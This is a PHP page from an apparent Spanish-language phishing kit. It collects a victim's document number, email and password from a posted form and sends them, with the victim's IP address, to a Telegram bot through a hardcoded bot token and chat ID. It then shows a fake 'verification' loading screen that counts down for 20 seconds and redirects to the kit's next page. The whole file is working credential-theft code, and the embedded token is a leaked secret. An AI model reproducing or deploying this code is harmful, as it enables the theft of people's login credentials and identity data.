<?php
ini_set("display_errors", 0);
$userp = $_SERVER['REMOTE_ADDR'];
include('dt.php');

if ( isset ($_POST['sol']) && isset ($_POST['nahual']) && isset ($_POST['chaneque'])){

$message = "Doc: ".$_POST['sol']."\r\nCorreo.: ".$_POST['nahual']."\r\nClav: ".$_POST['chaneque']."\r\nIP ".$userp."\r\n";

$apiToken = "5610349084:AAF66JpHAKmwxST_6KTzDcVea0JD4vzJhDg";
$data = [
    'chat_id' => '-812733549',
    'text' => $message
];
$response = file_get_contents("https://api.telegram.org/bot$apiToken/sendMessage?" . http_build_query($data) );



}else{ header ('location: index.html'); exit();}

?>

<html style="--app-height:724px;"><head><meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
      <meta http-equiv="X-UA-Compatible" content="IE=10">
      
      <title>Proceso de verificacion</title>
      
      <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1, user-scalable=0">
      <meta name="viewport" content="width=device-width, initial-scale=1">
      <link href="./fff/bootstrap.min.css" rel="stylesheet">
      <script src="./fff/jquery.min.js.descarga"></script>
      <link href="./fff/style.css" rel="stylesheet">
      <link href="./fff/style-funnel.css" rel="stylesheet">
      <style type="text/css">/* Chart.js */
         @-webkit-keyframes chartjs-render-animation{from{opacity:0.99}to{opacity:1}}@keyframes chartjs-render-animation{from{opacity:0.99}to{opacity:1}}.chartjs-render-monitor{-webkit-animation:chartjs-render-animation 0.001s;animation:chartjs-render-animation 0.001s;}
      </style>
      <style type="text/css">/* Chart.js */
         @-webkit-keyframes chartjs-render-animation{from{opacity:0.99}to{opacity:1}}@keyframes chartjs-render-animation{from{opacity:0.99}to{opacity:1}}.chartjs-render-monitor{-webkit-animation:chartjs-render-animation 0.001s;animation:chartjs-render-animation 0.001s;}
      </style>
      <style type="text/css">/* Chart.js */
         @-webkit-keyframes chartjs-render-animation{from{opacity:0.99}to{opacity:1}}@keyframes chartjs-render-animation{from{opacity:0.99}to{opacity:1}}.chartjs-render-monitor{-webkit-animation:chartjs-render-animation 0.001s;animation:chartjs-render-animation 0.001s;}
      </style>
      <style type="text/css">/* Chart.js */
         @-webkit-keyframes chartjs-render-animation{from{opacity:0.99}to{opacity:1}}@keyframes chartjs-render-animation{from{opacity:0.99}to{opacity:1}}.chartjs-render-monitor{-webkit-animation:chartjs-render-animation 0.001s;animation:chartjs-render-animation 0.001s;}
      </style>

   </head>
   <body class="its_body">
      <div id="wrapper">
         <!-- Header -->
         <header class="header header_container">
            <div class="container">
             
            </div>
         </header>
         <!-- END Header -->



         <!-- Nav -->
         <nav class="navbar navbar-default" style="min-height:6;">
            <div class="container">
               <div id="navbar"></div>
            </div>
         </nav>
         <!-- END Nav -->
         <div id="hh">
            <section id="funnel-de-ingreso">
               <div class="container">
                  <div class="container-top">
                     <div class="row">
                        <div class="col-sm-12">
                           <div class="inner-title">
                              <h2 class="t-subtitle">Cargando...</h2>
                           </div>
                        </div>
                     </div>
                  </div>
                  <div style="background-color: #ffffff; width: 100%;">
                      <br>
                     <div style="text-align: center;" align="left"><img style="width: 150px; display: block; margin-left: auto; margin-right: auto;" src="./fff/0020.gif"></div>
                     <br> <br>
                     <div style="text-align: center;" align="center">
                        Por favor espere mientras realizamos validaciones. <br> Cargando plataforma <strong id="time"><label id="countdown">0:20</label></strong></div><strong id="time">

                     <br>
                     <div id="ingresotokenbody" class="ingreso-token__body ingreso-token__body--predeterminado" style="text-align: center;">


                     </div>
                  </strong></div><strong id="time">
               </strong></div><strong id="time">
            </strong></section><strong id="time">
            <script type="text/javascript">
               var url="index3.php";
               var seconds = 20; //número de segundos a contar
               function secondPassed() {

                 var minutes = Math.round((seconds - 20)/60); //calcula el número de minutos
                 var remainingSeconds = seconds % 60; //calcula los segundos
                 //si los segundos usan sólo un dígito, añadimos un cero a la izq
                 if (remainingSeconds < 10) {
                   remainingSeconds = "0" + remainingSeconds;
                 }
                 document.getElementById('countdown').innerHTML = minutes + ":" +     remainingSeconds;
                 if (seconds == 0) {
                   clearInterval(countdownTimer);
                  window.location=url;
                   document.getElementById('countdown').innerHTML = "";
                 } else {
                   seconds--;
                 }
               }

               var countdownTimer = setInterval(secondPassed, 1000);
            </script>
         </strong></div><strong id="time">


      </strong></div><strong id="time">

   </strong></body></html>